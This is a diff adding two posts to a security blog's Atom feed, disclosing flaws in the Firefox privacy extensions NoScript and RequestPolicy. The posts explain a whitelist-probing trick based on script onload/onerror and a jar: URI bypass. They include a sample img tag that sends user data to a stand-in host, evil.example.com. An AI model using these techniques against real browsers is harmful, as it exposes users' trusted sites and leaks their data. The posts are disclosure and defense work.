@@ -4,7 +4,7 @@
   <title><![CDATA[Defined Misbehaviour]]></title>
   <link href="http://JordanMilne.github.io/atom.xml" rel="self"/>
   <link href="http://JordanMilne.github.io/"/>
-  <updated>2013-12-24T03:50:01-04:00</updated>
+  <updated>2013-12-24T04:16:37-04:00</updated>
   <id>http://JordanMilne.github.io/</id>
   <author>
     <name><![CDATA[Jordan Milne]]></name>
@@ -12,5 +12,114 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Abusing NoScript's Global Whitelist Rules to Reveal Trusted Sites (the Easy Way)]]></title>
+    <link href="http://JordanMilne.github.io/blog/2013/12/18/abusing-noscripts-global-whitelist-rules-to-reveal-trusted-sites-the-easy-way/"/>
+    <updated>2013-12-18T03:58:17-04:00</updated>
+    <id>http://JordanMilne.github.io/blog/2013/12/18/abusing-noscripts-global-whitelist-rules-to-reveal-trusted-sites-the-easy-way</id>
+    <content type="html"><![CDATA[<p>Here&rsquo;s one that&rsquo;s been <a href="http://www.w2spconf.com/2011/papers/jspriv.pdf">covered a bit before</a>: <a href="http://noscript.net/">NoScript</a> makes it easy for whitelisted sites to see what other sites are on the whitelist.</p>
+
+<h2>So what&#8217;s the issue?</h2>
+
+
+<p>Most of the pertinent info is in the previous paper, but I&rsquo;ll give a brief summary. By default NoScript operates in whitelist mode, forbidding scripts from all domains. Once a site has been added to the whitelist, scripts from that domain <em>as well as those included from other whitelisted domains</em> may be executed on the page.</p>
+
+<p>NoScript&rsquo;s default whitelist is fairly small, and users don&rsquo;t generally
+share sets of whitelist rules (like with Adblock Plus,) so if a
+site is whitelisted the user must have used or
+visited that site.</p>
+
+<p>Since the only whitelist is a global one (allowing scripts to run <i>on</i> facebook.com also allows other whitelisted domains to execute scripts <em>from</em> facebook.com,) whitelisted sites may infer what other sites are on the whitelist by including scripts from other domains and checking whether or not they execute.</p>
+
+<p>The method described in the paper involves finding a valid script file on the domain you want to test and observing its side effects (modifications to the <code>window</code> object or the DOM.) This can be tedious for an attacker, and requires a bit of manual work. It may also pollute the DOM / <code>window</code> object with junk and break our testing code!</p>
+
+<p>Luckily, there&rsquo;s an easier way. <a href="https://grepular.com/Abusing_HTTP_Status_Codes_to_Expose_Private_Information">Mike Cardwell describes</a> a method of determining if a cross-origin resource returned a 200 status code using <code>&lt;script&gt;</code> tags. The <code>&lt;script&gt;</code> tag&rsquo;s <code>onload</code> handler will trigger on a successful HTTP status code, and the <code>onerror</code> handler will trigger otherwise. The <code>&lt;script&gt;</code> tag&rsquo;s <code>onload</code> handler will trigger <em>even if</em> the resource isn&rsquo;t a valid script.</p>
+
+<p>The same method may be used to determine if NoScript has blocked a resource that would normally return a 200 HTTP status code. <code><a href="http://domain.tld/">http://domain.tld/</a></code> usually returns HTML with a 200 status code, so that&rsquo;s a pretty good candidate for testing.</p>
+
+<p>For example:</p>
+
+<figure class='code'><figcaption><span>onload/onerror example</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">&quot;http://google.com&quot;</span> <span class="na">onload=</span><span class="s">&quot;javascript:alert(&#39;google loaded&#39;)&quot;</span> <span class="na">onerror=</span><span class="s">&quot;javascript:alert(&#39;google failed&#39;)&quot;</span><span class="nt">&gt;&lt;/script&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If you have google.com whitelisted, this will say &ldquo;google loaded!&rdquo;. Otherwise (or if google.com is down for some reason) this will print &ldquo;google failed&rdquo;.</p>
+
+<h2>
+Cool, let&#8217;s see it in action!&nbsp;</h2>
+
+
+<p><a href="http://saynotolinux.com/tests/noscript/whitelist_disclosure.html">Here&rsquo;s an example</a> of how the attack may be used, including a timing attack based on the <a href="http://blog.saynotolinux.com/2013/11/bypassing-requestpolicys-whitelist.html">RequestPolicy bypass described in my last post</a>. Mind, the timing attack is a bit spotty, and generally doesn&rsquo;t work on
+the first page load. Refresh after the first load if you&rsquo;d like to see
+the bypass in action.</p>
+
+<p>If you don&rsquo;t have either RequestPolicy or NoScript installed, here&rsquo;s what you should see:</p>
+
+<div class="separator" style="clear: both; text-align: center;">
+<a href="http://4.bp.blogspot.com/-wdWk32ednQE/UrJGQuTCAnI/AAAAAAAAABM/EZXeykWLxtE/s1600/whitelist-disclosure.png" rel="prettyPhoto" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="320" src="http://4.bp.blogspot.com/-wdWk32ednQE/UrJGQuTCAnI/AAAAAAAAABM/EZXeykWLxtE/s320/whitelist-disclosure.png" width="291" /></a></div>
+
+
+
+
+<h2>
+How can it be fixed?</h2>
+
+
+<p>Global whitelist entries by their very nature leak info to any other site on the whitelist. This won&rsquo;t be fixed in NoScript until support for per-site whitelists is added and people are encouraged to remove their old global rules.</p>
+
+<p>In the meantime, using a <a href="https://github.com/JordanMilne/requestpolicy">patched RequestPolicy</a> will give you a per-site whitelist for <i>all </i>cross-domain requests, effectively mitigating the issue.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Bypassing RequestPolicy's Whitelist Using the Jar: URI Scheme]]></title>
+    <link href="http://JordanMilne.github.io/blog/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme/"/>
+    <updated>2013-11-29T04:11:39-04:00</updated>
+    <id>http://JordanMilne.github.io/blog/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme</id>
+    <content type="html"><![CDATA[<p>Here&rsquo;s an interesting bug I found while looking at some cross-domain data-stealing issues.&nbsp;It&rsquo;s possible to bypass <a href="https://www.requestpolicy.com/about.html">RequestPolicy</a>&rsquo;s whitelist entirely by referencing a resource nested in a <a href="http://www.gnucitizen.org/blog/web-mayhem-firefoxs-jar-protocol-issues/">jar URI</a>:</p>
+
+<figure class='code'><figcaption><span>Exfiltration example</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;jar:http://evil.example.com/logger?userdata=whatever!/foobar&quot;</span> <span class="nt">/&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Firefox will block the resource from being displayed even if it is
+valid (due to prior security issues with the jar URI scheme,) but a
+cross-domain request is made and it doesn&rsquo;t require JS to execute. This
+can be verified through the network pane in Firefox&rsquo;s dev tools. A limited amount of information <i>may</i> be sent back from the server by using timing information.</p>
+
+<p>Requests to jar URIs don&rsquo;t get processed by RequestPolicy because <a href="https://github.com/RequestPolicy/requestpolicy/blob/20815944fada20a34e75c54221e33259f11aa6c6/src/components/requestpolicyService.js#L1953">aContentLocation&rsquo;s asciiHost is undefined</a> when the jar URI scheme is used, and <a href="https://github.com/RequestPolicy/requestpolicy/blob/20815944fada20a34e75c54221e33259f11aa6c6/src/components/requestpolicyService.js#L1962">it gets treated as an internal request</a>. Since all <a href="https://github.com/RequestPolicy/requestpolicy/blob/20815944fada20a34e75c54221e33259f11aa6c6/src/components/requestpolicyService.js#L2035">internal requests are implicitly allowed</a>, the request goes through.</p>
+
+<p>I emailed Justin the patch a few months ago, but he hasn&rsquo;t responded.
+ Hopefully this gets fixed on the addons.mozilla.org version soon, since
+ it limits RequestPolicy&rsquo;s effectiveness at preventing data exfiltration.</p>
+
+<p>For now, you can use <a href="https://github.com/JordanMilne/requestpolicy">my fork of RequestPolicy</a>. I&rsquo;m not
+sure if the patch has any interactions with extensions, but it should also fix issues with
+nested use of the view-source scheme (which for some reason doesn&rsquo;t implement<i> </i><a href="http://dxr.mozilla.org/mozilla-central/source/netwerk/base/public/nsINestedURI.idl">nsINestedURI</a>.)</p>
+
+<h3>
+Proof-of-Concept </h3>
+
+
+<p>If you&rsquo;d like to see whether or not you&rsquo;re vulnerable, <a href="http://saynotolinux.com/tests/requestpolicy_jar.html">I&rsquo;ve made a Proof-of-Concept</a> that detects whether or not RequestPolicy blocked an image from a jar URI.</p>
+
+<p>Without the patch:</p>
+
+<div class="separator" style="clear: both; text-align: center;">
+<a href="http://4.bp.blogspot.com/--4IYDaxwuC8/Uph28XUFB6I/AAAAAAAAAAU/NXvbYQQ1Ja0/s1600/jar-broken.png" rel="prettyPhoto" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://lh3.ggpht.com/--4IYDaxwuC8/Uph28XUFB6I/AAAAAAAAAAU/NXvbYQQ1Ja0/s480/jar-broken.png" /></a></div>
+
+
+<p>With the patch:</p>
+
+<div class="separator" style="clear: both; text-align: center;">
+<a href="http://1.bp.blogspot.com/-jR_Dk43iwGQ/Uph2-PIDiaI/AAAAAAAAAAc/nImqMzTkTmA/s1600/jar-fixed.png" rel="prettyPhoto" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://lh3.ggpht.com/-jR_Dk43iwGQ/Uph2-PIDiaI/AAAAAAAAAAc/nImqMzTkTmA/s480/jar-fixed.png" /></a></div>
+
+
+
+]]></content>
+  </entry>
   
 </feed>
